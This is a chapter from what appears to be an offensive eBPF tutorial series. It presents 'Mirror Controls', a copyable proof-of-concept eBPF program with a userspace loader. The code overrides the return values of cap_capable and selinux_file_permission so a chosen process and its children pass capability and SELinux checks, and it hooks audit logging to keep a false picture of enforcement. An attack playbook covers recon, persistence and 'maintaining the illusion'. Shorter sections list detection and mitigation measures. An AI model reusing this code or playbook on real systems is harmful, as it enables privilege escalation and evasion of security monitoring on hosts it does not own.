# The Mirror Controls: Subverting Kernel Security Mechanisms

**Chapter 1: The First Revelation**

This chapter documents what a process holding `CAP_BPF` + `CAP_PERFMON` can do at the boundary of the kernel's capability and LSM checks: observe the decision via kprobe, and on certain annotated functions override the return value before the caller regains control.

This chapter covers overriding the return value of `cap_capable` and `selinux_file_permission` via `kretprobe + bpf_override_return`, demonstrating how a process holding `CAP_BPF` can make these checks return 0 to userspace callers while the kernel's actual enforcement path sees the original decision.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A["Security Control"] -->|"1. Enforcement Check"| B["Kernel Function"]
    C["eBPF Program"] -->|"2. Hook & Intercept"| B
    B -->|"3. Modified Decision"| D["Allow Operation"]
    E["Audit Log"] -->|"4. False Record"| F["Clean Logs"]
    G["Security Monitor"] -->|"5. Sees Compliance"| H["False Security"]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click A "https://man7.org/linux/man-pages/man7/capabilities.7.html" "Linux Capabilities Documentation"
    click B "https://elixir.bootlin.com/linux/latest/source/security/security.c" "Kernel Security Implementation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
```



**Why This Works (And Why It's Terrifying)**

Here's the thing that keeps me up at night: Linux security is built on trust. Trust that the kernel will enforce capabilities correctly. Trust that seccomp filters will actually block syscalls. Trust that SELinux will deny access when it should.

But what happens when you can intercept the very functions that make these decisions? What happens when you can whisper in the kernel's ear right before it decides whether to allow or deny something?

That's where eBPF comes in. It's not breaking these security mechanisms—it's becoming them. It's like having a corrupt judge who always rules in your favor while maintaining the appearance of a fair trial.

The scariest part? Everything looks completely normal from the outside. Audit logs show denials, monitoring tools report compliance, security dashboards stay green. Meanwhile, you're operating with god-mode privileges.

## How We Pull This Off

### The Security Theater We're Exploiting

Here's what we're working with—Linux has this whole elaborate security theater:
- **Capabilities**: Fancy way of saying "you can do this specific thing without being root"
- **Seccomp**: The syscall bouncer that's supposed to keep processes in line
- **SELinux/AppArmor**: The paranoid security guards that question everything
- **Namespaces**: The "you can't see me" walls between processes
- **Cgroups**: The resource police that make sure nobody hogs the CPU

Every single one of these has kernel functions that make the final "yes" or "no" decision. And that's where we come in.

### Our Attack Strategy

We're going to become the security system. Here's the game plan:

1. **Hook the decision makers**: We attach to functions like `cap_capable()` and `security_file_permission()` - the actual code that decides if you're allowed to do something
2. **Flip the script**: When these functions are about to return "access denied," we make them return "access granted" instead
3. **Keep up appearances**: The audit logs still show denials (gotta keep the security team happy)
4. **Cover our tracks**: We generate fake audit records that make it look like we're following the rules

The beauty is that we're not breaking anything—we're just becoming the thing that makes the decisions.

### Comprehensive POC

```c
// @interactive: true
// @copyable: true
// Real-world eBPF exploitation proof of concept (FIXED)
// This demonstrates a practical attack scenario for bypassing Linux security controls
// while maintaining the appearance of proper enforcement.

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/ptrace.h>
#include <linux/security.h>
#include <linux/audit.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration for our target process
#define TARGET_PID 1234        // Process we want to give elevated privileges
#define TARGET_FILENAME "sensitive_data.txt"  // File we want to access

// Structure to track security events for logging and analysis
struct security_event {
    u32 pid;                // Process ID
    u8 comm[16];            // Command name
    u64 timestamp;          // Event timestamp
    void *security_ptr;     // Pointer to security context
    int security_result;    // Original security decision
    int modified_result;    // Our modified decision
    char filename[64];      // Target filename (if applicable)
    u32 audit_id;           // Audit event ID for correlation
};

// Map to store our fake audit events for correlation
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(struct security_event));
    __uint(max_entries, 1024);
} fake_audit_events SEC(".maps");

// Map to track processes we've modified permissions for
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u8));
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if this is our target process
static __always_inline bool is_target_process(u32 pid) {
    if (pid == TARGET_PID)
        return true;
    
    u8 *tracked = bpf_map_lookup_elem(&target_processes, &pid);
    return tracked && *tracked == 1;
}

// Helper function to check if this is our target file
static __always_inline bool is_target_file(const char *filename) {
    char target[] = TARGET_FILENAME;
    
    for (int i = 0; i < sizeof(target) - 1; i++) {
        if (filename[i] != target[i]) return false;
        if (filename[i] == '\0') break;
    }
    
    return true;
}

// Helper to generate a unique audit ID
static __always_inline u32 generate_audit_id(void) {
    u64 ts = bpf_ktime_get_ns();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    return (u32)(ts ^ pid);
}

// FIXED: Use kprobe with proper return value modification
SEC("kprobe/cap_capable")
int BPF_KPROBE(hook_cap_check, const struct cred *cred, struct user_namespace *ns,
               int cap, unsigned int opts) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid)) {
        struct security_event event = {
            .pid = pid,
            .timestamp = bpf_ktime_get_ns(),
            .security_ptr = (void *)cred,
            .security_result = -1, // Original result would be deny (-EPERM)
            .modified_result = 0,  // We are forcing an allow
            .audit_id = generate_audit_id(),
        };
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        bpf_map_update_elem(&fake_audit_events, &event.audit_id, &event, BPF_ANY);
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// FIXED: Use kretprobe to modify return value
SEC("kretprobe/cap_capable")
int BPF_KRETPROBE(hook_cap_check_ret, int ret) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid) && ret != 0) {
        // Override the return value to allow the capability check
        bpf_override_return(ctx, 0);
    }
    
    return 0;
}

// FIXED: Use kprobe for SELinux checks
SEC("kprobe/selinux_file_permission")
int BPF_KPROBE(hook_selinux, struct file *file, int mask) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid)) {
        char filename[64] = {};
        bpf_probe_read_kernel_str(filename, sizeof(filename), file->f_path.dentry->d_name.name);
        
        if (is_target_file(filename)) {
            struct security_event event = {
                .pid = pid,
                .timestamp = bpf_ktime_get_ns(),
                .security_result = -1, // Original result would be deny
                .modified_result = 0,  // We are forcing an allow
                .audit_id = generate_audit_id(),
            };
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            __builtin_memcpy(event.filename, filename, sizeof(event.filename));
            
            bpf_map_update_elem(&fake_audit_events, &event.audit_id, &event, BPF_ANY);
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        }
    }
    
    return 0;
}

// FIXED: Use kretprobe to modify SELinux return value
SEC("kretprobe/selinux_file_permission")
int BPF_KRETPROBE(hook_selinux_ret, int ret) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid) && ret != 0) {
        // Override the return value to allow the file access
        bpf_override_return(ctx, 0);
    }
    
    return 0;
}


// NOTE: Bypassing seccomp is more complex than a simple return value override.
// An effective seccomp bypass would involve parsing and modifying the filter
// itself, which is a significantly more advanced technique. For this PoC,
// we will focus on monitoring seccomp checks rather than bypassing them.
SEC("kprobe/seccomp_check_filter")
int BPF_KPROBE(hook_seccomp, struct seccomp_filter *filter) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid)) {
        struct security_event event = {
            .pid = pid,
            .timestamp = bpf_ktime_get_ns(),
        };
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Create deceptive audit logs
SEC("kprobe/audit_log_start")
int BPF_KPROBE(hook_audit, struct audit_context *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_target_process(pid)) {
        u32 audit_id = generate_audit_id(); // This needs a more reliable correlation method
        struct security_event *event = bpf_map_lookup_elem(&fake_audit_events, &audit_id);
        
        if (event) {
            // NOTE: Actually modifying audit context here is highly complex
            // and kernel-version specific. A real rootkit would need
            // to carefully craft fake log entries.
            bpf_map_delete_elem(&fake_audit_events, &audit_id);
        }
    }
    
    return 0;
}

// FIXED: Add child processes of our target to our tracking map
SEC("kprobe/wake_up_new_task")
int BPF_KPROBE(hook_new_task, struct task_struct *task) {
    // FIXED: Correctly get parent PID from the task_struct
    struct task_struct *parent = NULL;
    bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent);
    if (parent) {
        pid_t parent_pid = 0;
        bpf_probe_read_kernel(&parent_pid, sizeof(parent_pid), &parent->tgid);

        if (is_target_process((u32)parent_pid)) {
            pid_t child_pid = 0;
            bpf_probe_read_kernel(&child_pid, sizeof(child_pid), &task->tgid);
            if (child_pid > 0) {
                 u8 value = 1;
                 u32 child_pid_u32 = (u32)child_pid;
                 bpf_map_update_elem(&target_processes, &child_pid_u32, &value, BPF_ANY);
            }
        }
    }
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the eBPF security bypass

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "mirror_controls.skel.h" // This header is auto-generated by bpftool

// This structure must match the one in the eBPF C code
struct security_event {
    u32 pid;
    u8 comm[16];
    u64 timestamp;
    void *security_ptr;
    int security_result;
    int modified_result;
    char filename[64];
    u32 audit_id;
};

static volatile bool exiting = false;

// Callback function to handle events received from the kernel
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz) {
    struct security_event *e = data;
    printf("[\033[0;31mBYPASS\033[0m] PID %d (%s) - Original Result: %d, Modified: %d\n",
           e->pid, e->comm, e->security_result, e->modified_result);
    
    if (e->filename[0] != '\0') {
        printf("  LSM Bypass on file: %s\n", e->filename);
    } else {
        printf("  Capability Check Bypass\n");
    }
}

static void sig_handler(int sig) {
    exiting = true;
}

int main(int argc, char **argv) {
    struct mirror_controls_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler for graceful shutdown
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // libbpf-based programs need to increase the memory lock resource limit
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    if (setrlimit(RLIMIT_MEMLOCK, &rlim)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit\n");
        return 1;
    }

    // Open, load, and verify BPF application
    skel = mirror_controls_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach tracepoints, kprobes, and other BPF programs to their hooks
    err = mirror_controls_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %s\n", strerror(-err));
        goto cleanup;
    }

    // Set up perf buffer to receive events from the kernel
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 8, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -errno;
        fprintf(stderr, "Failed to create perf buffer: %s\n", strerror(-err));
        goto cleanup;
    }

    printf("Mirror Controls eBPF program successfully loaded and attached!\n");
    printf("Bypassing security controls for PID %d and its children...\n", TARGET_PID);
    printf("Press Ctrl+C to exit\n");

    // Main loop: poll for events from the kernel
    while (!exiting) {
        err = perf_buffer__poll(pb, 100 /* timeout, ms */);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %s\n", strerror(-err));
            goto cleanup;
        }
        // Reset err for the next poll
        err = 0;
    }

cleanup:
    perf_buffer__free(pb);
    mirror_controls_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Detection Methods

Defenders should implement multiple layers of detection:

1. **eBPF Program Monitoring**:
   - Monitor for unexpected eBPF programs attached to security-related functions
   - Track eBPF program loading patterns and verify signatures
   - Use tools like `bpftool` to list and inspect loaded programs

2. **Behavioral Analysis**:
   - Look for discrepancies between security policy and actual system behavior
   - Implement out-of-band monitoring that doesn't rely on kernel audit mechanisms
   - Use statistical analysis to detect anomalies in security enforcement patterns

3. **Integrity Verification**:
   - Implement kernel integrity monitoring
   - Use secure boot and measured boot to verify kernel integrity
   - Deploy runtime integrity checking for critical security subsystems

4. **Cross-Validation**:
   - Deploy multiple independent security monitoring systems
   - Compare results from different monitoring approaches
   - Look for inconsistencies that might indicate tampering

5. **Specific Indicators**:
   - Processes that appear to function despite security restrictions
   - Mismatches between audit logs and observed behavior
   - Unusual patterns in security-related syscalls

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   podman run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # Restrict BPF syscall with seccomp
   seccomp-bpf-filter.json:
   {
     "defaultAction": "SCMP_ACT_ALLOW",
     "syscalls": [
       {
         "name": "bpf",
         "action": "SCMP_ACT_ERRNO"
       }
     ]
   }
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use eBPF-Based Security Tools**:
   - Deploy tools like Falco, Tracee, or Tetragon that can detect malicious eBPF usage
   - Implement custom eBPF programs that monitor for security bypasses

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security controls, especially in environments where multiple layers of security are expected to provide defense-in-depth.

## Detection

The security teams aren't completely clueless. Here's what they'll try to do to stop our LSM manipulation:

1. **Strip eBPF capabilities** from containers and untrusted processes
2. **Deploy BPF LSM policies** that restrict who can load eBPF programs
3. **Monitor for suspicious eBPF attachments** to security-critical functions
4. **Use multiple security layers** so bypassing one doesn't break everything
5. **Implement integrity checks** for security subsystems
6. **Deploy eBPF-based security tools** that can detect malicious eBPF usage

But here's the thing—if we've already got eBPF access, we can probably bypass most of these defenses too.

## Our Attack Playbook

Here's how we execute this attack from start to finish:

1. **Recon the target** - Find systems with eBPF capabilities and identify the security controls
2. **Map the kernel** - Locate the functions responsible for security enforcement
3. **Craft our hooks** - Develop eBPF programs that intercept these enforcement points
4. **Get privileged access** - Load our malicious BPF programs with appropriate privileges
5. **Subvert decisions** - Modify security decisions to allow prohibited operations
6. **Maintain the illusion** - Ensure audit logs show "denied" while operations succeed
7. **Stay persistent** - Keep our eBPF programs loaded and active

## Their Defense Playbook

The blue team will try to stop us with:

1. **Capability restrictions** - Remove [`CAP_BPF`](https://man7.org/linux/man-pages/man7/capabilities.7.html) from untrusted processes
2. **BPF LSM policies** - Implement policies that restrict eBPF program loading
3. **Anomaly detection** - Monitor for unexpected eBPF programs on security functions
4. **Defense in depth** - Use multiple independent security monitoring mechanisms
5. **Integrity verification** - Implement checks for security subsystem integrity
6. **Fight fire with fire** - Use eBPF-based security tools to detect malicious eBPF

## Why This Matters

The primitive in this chapter lies to userspace consumers of the syscall return, not to the kernel itself. A subsequent LSM check that consults `current->cred` inside the kernel is unaffected by the override. Orchestrators that make security decisions based on syscall return values see the forged answer; post-checks against `/proc/self/status` or `/proc/<pid>/status` see the ground truth. This is the durable shape of Class I primitives from chapter 20.

## POC

Companion code: [`ch01-mirror-controls`]({{ site.baseurl }}/dBPF-pocs/pocs/ch01-mirror-controls/)
